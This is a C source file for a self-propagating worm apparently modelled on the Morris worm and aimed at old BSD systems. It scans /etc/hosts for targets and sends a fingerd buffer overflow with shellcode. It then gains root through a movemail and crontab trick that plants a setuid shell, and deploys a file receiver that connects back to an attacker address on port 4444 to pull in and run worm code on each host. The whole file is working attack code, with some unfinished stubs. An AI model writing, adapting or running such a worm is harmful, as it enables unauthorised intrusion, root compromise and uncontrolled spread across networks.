#include "worm.h"
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define HOSTS_FILE "/etc/hosts"
#define MAX_IP_LEN 64
#define RECEIVE_FILE_BSD_PATH "/receive_file_bsd.c"
#define WORM_PATH "/worm.c"

/**
 * Deploys receive_file_bsd.c on target machine
 * sock - The active root shell
 */
void deploy_receive_file(int sock) {
    char cmd_buf[IO_BUF_SIZE];
    
    const char *file_contents = 
        "#include <stdio.h>\n"
        "#include <sys/types.h>\n"
        "#include <sys/socket.h>\n"
        "#include <netinet/in.h>\n"
        "#include <sys/time.h>\n"
        "#include <arpa/inet.h>\n\n"
        "#define SERVER_IP \"172.17.0.1\"\n"
        "#define SERVER_PORT 4444\n"
        "#define IO_BUF_SIZE 2048\n\n"
        "int send_int(num, fd) int num; int fd; {\n"
        "    unsigned long conv = htonl((unsigned long)num);\n"
        "    char *data = (char*)&conv;\n"
        "    int left = sizeof(conv);\n"
        "    int rc;\n"
        "    do {\n"
        "        rc = write(fd, data, left);\n"
        "        if (rc < 0) return -1;\n"
        "        else { data += rc; left -= rc; }\n"
        "    } while (left > 0);\n"
        "    return 0;\n"
        "}\n\n"
        "int receive_int(num, fd) int *num; int fd; {\n"
        "    unsigned long ret;\n"
        "    char *data = (char*)&ret;\n"
        "    int left = sizeof(ret);\n"
        "    int rc;\n"
        "    do {\n"
        "        rc = read(fd, data, left);\n"
        "        if (rc <= 0) return -1;\n"
        "        else { data += rc; left -= rc; }\n"
        "    } while (left > 0);\n"
        "    *num = ntohl(ret);\n"
        "    return 0;\n"
        "}\n\n"
        "int main() {\n"
        "    int i, j, n;\n"
        "    int server_sock, file_size, len, num_files;\n"
        "    struct timeval tv;\n"
        "    struct sockaddr_in serv_addr;\n"
        "    char io_buf[IO_BUF_SIZE];\n"
        "    fd_set read_fds;\n"
        "    FILE *outfile;\n"
        "    char *file_name;\n"
        "    char *msg = \"Files recieved\\n\";\n"
        "    char *hello = \"Hello from client!\\n\";\n\n"
        "    server_sock = socket(AF_INET, SOCK_STREAM, 0);\n"
        "    if (server_sock < 0) return 1;\n"
        "    bzero((char *)&serv_addr, sizeof(serv_addr));\n"
        "    serv_addr.sin_family = AF_INET;\n"
        "    serv_addr.sin_port = htons(SERVER_PORT);\n"
        "    serv_addr.sin_addr.s_addr = inet_addr(SERVER_IP);\n\n"
        "    while (connect(server_sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {\n"
        "        sleep(1);\n"
        "    }\n\n"
        "    while (1) {\n"
        "        write(server_sock, hello, strlen(hello));\n"
        "        FD_ZERO(&read_fds);\n"
        "        FD_SET(server_sock, &read_fds);\n"
        "        tv.tv_sec = 5; tv.tv_usec = 0;\n"
        "        if (select(server_sock + 1, &read_fds, (fd_set *)0, (fd_set *)0, &tv) > 0) {\n"
        "            if (receive_int(&num_files, server_sock) < 0) continue;\n"
        "            send_int(num_files, server_sock);\n"
        "            for (i = 0; i < num_files; i++) {\n"
        "                if (receive_int(&len, server_sock) < 0) continue;\n"
        "                file_name = (char *)malloc((len + 1) * sizeof(char));\n"
        "                n = read(server_sock, file_name, len);\n"
        "                file_name[n] = '\\0';\n"
        "                outfile = fopen(file_name, \"w\");\n"
        "                if (receive_int(&file_size, server_sock) < 0) continue;\n"
        "                while (file_size > 0) {\n"
        "                    n = read(server_sock, io_buf, IO_BUF_SIZE -1);\n"
        "                    if (n > 0) { io_buf[n] = '\\0'; fputs(io_buf, outfile); }\n"
        "                    file_size -= n;\n"
        "                }\n"
        "                fclose(outfile); free(file_name);\n"
        "                send_int(i, server_sock);\n"
        "            }\n"
        "            write(server_sock, msg, strlen(msg));\n"
        "            break;\n"
        "        }\n"
        "    }\n"
        "    close(server_sock);\n"
        "    return 0;\n"
        "}\n";

    // Start the cat command
    write_to_sock(sock, "cat > /tmp/receive_file.c << 'EOF'\n");

    // Send file contents
    write_to_sock(sock, (char *)file_contents);
    write_to_sock(sock, "EOF\n");
    sleep(5);

    // cleanup
    memset(cmd_buf, 0, IO_BUF_SIZE);
    read_from_sock(sock, cmd_buf, IO_BUF_SIZE);
}

/**
 * Deploys worm.c and worm.h source code to the remote target.
 * sock - The active root shell.
 * REALLY SHOULD NOT NEED THIS, currently uncalled - just ignore, will delete later
 */
void deploy_worm(int sock) {
    char cmd_buf[IO_BUF_SIZE];
    char temp_io[IO_BUF_SIZE];

    // Define worm.h
    const char *worm_h_contents = 
    "#ifndef WORM_H_\n"
    "#define WORM_H_\n\n"
    "#include <stdio.h>\n"
    "#include <stdlib.h>\n"
    "#include <string.h>\n"
    "#include <sys/socket.h>\n"
    "#include <arpa/inet.h>\n"
    "#include <unistd.h>\n\n"
    "#define FINGERD_PORT 79\n\n"
    "/* Buffer overflow related things */\n"
    "#define BUF_SIZE 512 + 16 + 4\n"
    "#define PAYLOAD \"\\\\335\\\\217/sh\\0\\\\335\\\\217/bin\\\\320^Z\\\\335\\0\\\\335\\0\\\\335Z\\\\335\\003\\\\320^\\\\\\\\274;\\\\344\\\\371\\\\344\\\\342\\\\241\\\\256\\\\343\\\\350\\\\357\\\\256\\\\362\\\\351\"\n"
    "#define PAYLOAD_LEN 28\n"
    "#define NOP 0x01\n\n"
    "#define PATIENCE 3\n"
    "#define IO_BUF_SIZE 2048\n\n"
    "/* Movemail exploit commands */\n"
    "#define MOVEMAIL_EXPLOIT \"(umask 0 && /etc/movemail /dev/null /usr/lib/crontab.local)\\n\"\n"
    "#define CRONTAB_EXPLOIT \"(echo \\\"* * * * * root cp /bin/sh /tmp && chmod u+s /tmp/sh\\\"; echo \\\"* * * * * root rm -f /usr/lib/crontab.local\\\") > /usr/lib/crontab.local\\n\"\n"
    "#define CHECK_FOR_SHELL \"ls /tmp/sh\\n\"\n"
    "#define RUN_SHELL \"/tmp/sh\\n\"\n"
    "#define NOT_FOUND \"/tmp/sh not found\"\n\n"
    "struct file_object {\n"
    "    char *file_name;\n"
    "    FILE *file_ptr;\n"
    "    int file_size;\n"
    "};\n\n"
    "void create_sockaddr(struct sockaddr_in *serv_addr, char *ip, int port) {\n"
    "    serv_addr->sin_family = AF_INET;\n"
    "    serv_addr->sin_port = htons(port);\n"
    "    inet_pton(AF_INET, ip, &serv_addr->sin_addr);\n"
    "}\n\n"
    "void create_exploit(char *buf, char *shellcode, ssize_t buf_size, size_t shellcode_len) {\n"
    "    int i, j;\n"
    "    int extra_words = 4 * 4;\n"
    "    int address_size = 4;\n"
    "    for (i = 0; i < buf_size; i++) buf[i] = NOP;\n"
    "    for (j = 0; j < shellcode_len; j++) buf[300+j] = shellcode[j];\n"
    "    for (i = buf_size - extra_words - address_size; i < buf_size - address_size; i ++) { buf[i] = 0x00; }\n"
    "    for (i = buf_size - address_size; i < buf_size; i += 4) {\n"
    "        buf[i]   = 0x38; buf[i+1] = 0xea; buf[i+2] = 0xff; buf[i+3] = 0x7f;\n"
    "    }\n"
    "}\n\n"
    "void read_from_sock(int sock, char *io_buf, size_t buf_size) {\n"
    "    fd_set read_fds;\n"
    "    int num_tries = 0;\n"
    "    while (num_tries < PATIENCE) {\n"
    "        FD_ZERO(&read_fds);\n"
    "        FD_SET(sock, &read_fds);\n"
    "        struct timeval tv; tv.tv_sec = 1; tv.tv_usec = 0;\n"
    "        int ready_fds = select(sock + 1, &read_fds, NULL, NULL, &tv);\n"
    "        if (ready_fds > 0 && FD_ISSET(sock, &read_fds)) {\n"
    "            int n = read(sock, io_buf, buf_size - 1);\n"
    "            if (n > 0) { io_buf[n] = '\\0'; printf(\"%s\", io_buf); fflush(stdout); num_tries = 0; }\n"
    "            else break;\n"
    "        } else num_tries++;\n"
    "    }\n"
    "}\n\n"
    "void write_to_sock(int sock, char *text) {\n"
    "    fd_set write_fds;\n"
    "    int num_tries = 0; size_t total_sent = 0; size_t len = strlen(text);\n"
    "    while (num_tries < PATIENCE) {\n"
    "        FD_ZERO(&write_fds); FD_SET(sock, &write_fds);\n"
    "        struct timeval tv; tv.tv_sec = 1; tv.tv_usec = 0;\n"
    "        int ready_fds = select(sock + 1, NULL, &write_fds, NULL, &tv);\n"
    "        if (ready_fds > 0 && FD_ISSET(sock, &write_fds)) {\n"
    "            int n = write(sock, text + total_sent, len - total_sent);\n"
    "            if (n > 0) { total_sent += n; num_tries = 0; }\n"
    "            else break;\n"
    "        } else num_tries++;\n"
    "    }\n"
    "}\n\n"
    "void get_root_shell_via_movemail_exploit(int sock, char *io_buf, size_t buf_size) {\n"
    "    write_to_sock(sock, MOVEMAIL_EXPLOIT);\n"
    "    write_to_sock(sock, CRONTAB_EXPLOIT);\n"
    "    do {\n"
    "        write_to_sock(sock, CHECK_FOR_SHELL);\n"
    "        read_from_sock(sock, io_buf, buf_size);\n"
    "        sleep(10);\n"
    "    } while (!strncmp(NOT_FOUND, io_buf, strlen(NOT_FOUND)));\n"
    "    write_to_sock(sock, RUN_SHELL);\n"
    "}\n\n"
    "long int get_file_size(FILE *file_ptr) {\n"
    "    if (file_ptr == NULL) return -1;\n"
    "    fseek(file_ptr, 0L, SEEK_END);\n"
    "    long int res = ftell(file_ptr);\n"
    "    rewind(file_ptr);\n"
    "    return res;\n"
    "}\n\n"
    "int send_int(int num, int fd) {\n"
    "    int32_t conv = htonl(num);\n"
    "    char *data = (char*)&conv; int left = sizeof(conv); int rc;\n"
    "    do {\n"
    "        rc = write(fd, data, left);\n"
    "        if (rc < 0) return -1;\n"
    "        else { data += rc; left -= rc; }\n"
    "    } while (left > 0);\n"
    "    return 0;\n"
    "}\n\n"
    "int receive_int(int *num, int fd) {\n"
    "    int32_t ret;\n"
    "    char *data = (char*)&ret; int left = sizeof(ret); int rc;\n"
    "    do {\n"
    "        rc = read(fd, data, left);\n"
    "        if (rc <= 0) return -1;\n"
    "        else { data += rc; left -= rc; }\n"
    "    } while (left > 0);\n"
    "    *num = ntohl(ret);\n"
    "    return 0;\n"
    "}\n\n"
    "int load_files(char **file_paths, int num_files, struct file_object* files) {\n"
    "    int i;\n"
    "    for (i = 0; i < num_files; i++) {\n"
    "        files[i].file_name = file_paths[i];\n"
    "        files[i].file_ptr = fopen(file_paths[i], \"r\");\n"
    "        if (files[i].file_ptr == NULL) return -1;\n"
    "        files[i].file_size = get_file_size(files[i].file_ptr);\n"
    "    }\n"
    "    return 0;\n"
    "}\n\n"
    "int send_files(int client_sock, struct file_object *files, int num_files, char *file_buf, int buf_size) {\n"
    "    int i, j, len, file_size, response;\n"
    "    char *file_name;\n"
    "    if (send_int(num_files, client_sock) < 0) return -1;\n"
    "    if (receive_int(&response, client_sock) < 0) return -1;\n"
    "    for (i = 0; i < num_files; i++) {\n"
    "        file_name = files[i].file_name; len = strlen(file_name);\n"
    "        if (send_int(len, client_sock)) return -1;\n"
    "        send(client_sock, file_name, len, 0);\n"
    "        file_size = files[i].file_size;\n"
    "        if (send_int(file_size, client_sock) < 0) return -1;\n"
    "        while (fgets(file_buf, buf_size, files[i].file_ptr) != NULL) {\n"
    "            send(client_sock, file_buf, strlen(file_buf), 0);\n"
    "        }\n"
    "        rewind(files[i].file_ptr);\n"
    "        if (receive_int(&j, client_sock) < 0) return -1;\n"
    "    }\n"
    "    return 0;\n"
    "}\n"
    "#endif\n";

    // Define worm.c
    const char *worm_c_contents = // put real worm.c contents here
        "#include \"worm.h\"\n"
        "#include <stdio.h>\n"
        "int main() {\n"
        "    printf(\"Worm executing...\\n\");\n"
        "    return 0;\n"
        "}\n";

    // Send worm.h
    printf("[*] Sending worm.h...\n");
    write_to_sock(sock, "cat > /tmp/worm.h << 'EOF'\n");
    write_to_sock(sock, (char *)worm_h_contents);
    write_to_sock(sock, "\nEOF\n");
    
    sleep(2);
    read_from_sock(sock, temp_io, IO_BUF_SIZE);

    // Send worm.c
    printf("[*] Sending worm.c...\n");
    write_to_sock(sock, "cat > /tmp/worm.c << 'EOF'\n");
    write_to_sock(sock, (char *)worm_c_contents);
    write_to_sock(sock, "\nEOF\n");

    sleep(2);
    read_from_sock(sock, temp_io, IO_BUF_SIZE);
}

/*
 * Attempts to propagate the worm to a target host passed in via ip argument
 * Creates socket to fingerd, sends exploit, and executes propagation commands
 */
void infect(char *ip) {
	int sock = 0;
	struct sockaddr_in serv_addr;
	char buf[BUF_SIZE] = {0};
	char io_buf[IO_BUF_SIZE] = {0};
	char cmd_buf[IO_BUF_SIZE] = {0};
	FILE *fp;
	int file_size;
	int bytes_read;

	printf("[*] Attempting to infect: %s\n", ip);
	fflush(stdout);

	/* Create socket to connect to fingerd */
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {
		printf("[-] Failed to create socket for %s\n", ip);
		return;
	}

	/* Set up socket address structure */
	create_sockaddr(&serv_addr, ip, FINGERD_PORT);

	/* Connect to fingerd, print error if failed */
	if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
		printf("[-] Failed to connect to fingerd on %s\n", ip);
		close(sock);
		return;
	}

    /* If we made it here, we are conneceted to fingerd on the target, so we
    create and send the buffer overflow exploit. Bang. */
	printf("[+] Connected to fingerd on %s, sending exploit...\n", ip);
	fflush(stdout);
	create_exploit(buf, PAYLOAD, (ssize_t)BUF_SIZE, (ssize_t)PAYLOAD_LEN);
	write(sock, buf, sizeof(buf));
	sleep(5); // let it cook

	/* Now we should have a shell - use movemail exploit to get root */
	printf("[*] Using movemail exploit to get root...\n");
	get_root_shell_via_movemail_exploit(sock, io_buf, IO_BUF_SIZE);
    sleep(5); // more cooking
	printf("[+] Got root shell (bang), sending files...\n");
	fflush(stdout);

	// Send receive_file_bsd.c (vector) over
	deploy_receive_file(sock);

    // Compile and run receive_file, should pull in worm.c and worm.h from attakcer
	printf("[*] Compiling receive_file.c on target...\n");
	write_to_sock(sock, "cc /tmp/receive_file.c -o /tmp/receive_file\n");
	sleep(2);
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

	printf("[*] Running file receiver on target...\n");
	write_to_sock(sock, "/tmp/receive_file &\n");
	sleep(2);
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

    // compile worm.c and run it, completing self propogation
	printf("[*] Compiling worm.c on target...\n");
	write_to_sock(sock, "cc /tmp/worm.c -o /tmp/worm\n");
	sleep(2);
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

	printf("[+] Running worm.c on target...\n");
	write_to_sock(sock, "/tmp/worm &\n");
	sleep(2);
	read_from_sock(sock, io_buf, IO_BUF_SIZE);

    // Infection and self propogation complete (bang)
	printf("[+] Infection of %s complete!\n", ip);
	close(sock);
}

int main() {
	FILE *fp;
	char line[128];
	char ip[MAX_IP_LEN];

	printf("[*] Worm Started\n");
	fflush(stdout);

	/* Infinite loop for continuous propagation */
	while (1) {
		printf("\n[*] Scanning /etc/hosts for targets...\n");
		fflush(stdout);

		/* Open /etc/hosts file */
		fp = fopen(HOSTS_FILE, "r");
		if (fp == NULL) {
			printf("[-] Could not open %s\n", HOSTS_FILE);
			sleep(25);
			continue;
		}

		/* Read each line from /etc/hosts */
		while (fgets(line, 128, fp) != NULL) {
			/* Skip comments, empty lines, and whitespace-only lines */
			if (line[0] == '#' || line[0] == '\n' || line[0] == ' ')
				continue;

			/* Extract IP address from line */
			if (sscanf(line, "%63s", ip) != 1)
				continue;

			/* Skip localhost and our own IP */
			if (strcmp(ip, "127.0.0.1") == 0)
				continue;
			if (strcmp(ip, "10.0.2.15") == 0)
				continue;

			/* Infect the target */
			infect(ip);

			/* delay between infections, dont want to overwhelm network */
			sleep(10);
		}

		fclose(fp);

		/* Logic for rescanning */
		// printf("[*] Scan complete, waiting before next scan...\n");
		// sleep(300);  /* Wait 5 minutes before scanning again */
	}

	return 0;
}
